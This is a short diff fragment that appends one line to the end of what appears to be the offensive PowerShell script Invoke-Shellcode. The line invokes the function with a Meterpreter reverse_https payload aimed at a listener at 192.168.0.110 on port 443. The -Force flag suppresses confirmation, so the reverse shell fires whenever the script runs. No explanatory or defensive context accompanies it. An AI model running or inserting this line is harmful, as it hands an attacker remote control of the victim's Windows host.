@@ -612,3 +612,4 @@ function Invoke-Shellcode
         }
     }   
 }
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.110 -Lport 443 -Force
